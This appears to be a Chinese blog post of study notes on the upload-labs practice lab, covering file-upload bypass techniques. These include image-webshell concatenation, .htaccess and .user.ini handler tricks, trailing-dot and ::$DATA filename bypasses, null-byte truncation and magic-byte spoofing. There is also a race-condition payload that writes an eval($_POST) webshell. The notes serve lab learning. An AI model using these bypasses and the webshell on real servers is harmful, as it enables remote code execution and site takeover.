upload-labs笔记

发表于2025-04-19|更新于2025-07-30
|浏览量:

  1. copy /b 图片.jpg + 木马.txt 输出文件.jpg copy 7.png/b + 111.txt 7_111.png

  2. .htaccess>httpd.conf——AddHandler application/x-httpd-php .jpg将jpg文件当作php文件解析

    .user.ini>php.ini——-auto_pretend_file=111.jpg任何php文件执行前先执行111.jpg中包含的php代码

  3. pass5为什么能用111.php. .绕过：（以下为源码用于过滤文件名的部分）

    • 先删除末尾的点变为111.php.
    • 截取文件扩展名. ，不在黑名单里，放行文件
    • windows会自动删除扩展名中的点和空格，于是最终接收到的文件从111.php. 变为111.php，从而实现绕过（pass7中对接收到的文件进行重命名：__时间序列.处理过的的后缀名__，如果原文件为111.php. .那么读取到的后缀名就是. ，最终接收到的文件后缀变为空，就无法绕过，所以直接将上传的文件名改为111.php 即可）

    move_uploaded_file会将后缀中的\也删除

    0x00截断

  4. 额外数据流：(__::$DATA__为主数据流)

    • echo 内容 >> 1.txt:名称
    • type 2.txt >> 1.txt:名称

  5. __JPEG/JFIF__（常见的照片格式)：头两个字节为__·OxFF·OxD8__。
    __PNG__（无损压缩格式)：头两个字节为__·0x89·0x50__。
    __GIF__（支持动画的图像格式)：头两个字节为__·0x47·0x49__。
    BMP(Windows位图格式)：头两个字节为__·Ox42·0x4D__。
    __TIFF__（标签图像文件格式)：头两个字节可以是不同的数值。

  6. getimagesize函数读取文件内容并解析其中的图像信息。该函数会返回一个数组，数组的第三个元素（$info[2]）是一个整数，代表文件实际的图像类型。

    在php中getimagesize会获取7个元素的值，分别为：

    索引 0 给出的是图像宽度的像素值
索引 1 给出的是图像高度的像素值
索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的<image> 标签
索引 bits 给出的是图像的每种颜色的位数，二进制格式
索引 channels 给出的是图像的通道值，RGB 图像默认是 3
索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);

  7. 二次渲染：用010比较渲染前后的文件，在共同部分插入一句话木马，有时候木马会破坏文件或者还是会在二次渲染时被破坏，多试几次

  8. 条件竞争：服务器会先保存文件再对文件检查删除，那就可以在两者时间间隙访问文件，

    文件内容：

    <?php fputs(fopen('111.php', 'w'), '<?php phpinfo();@eval($_POST["X"]) ?>');?>

    作用：在执行文件的瞬间生成一个木马（执行后文件还是会被反复删除）

  9. post数据时直接上传数组成员数据

​ 两种方式都可以绕过，原理：将__save_name[0]__与.与__save_name[成员数-1]__拼接成新的文件名，成员数为实 际成员个数，而不是数组长度
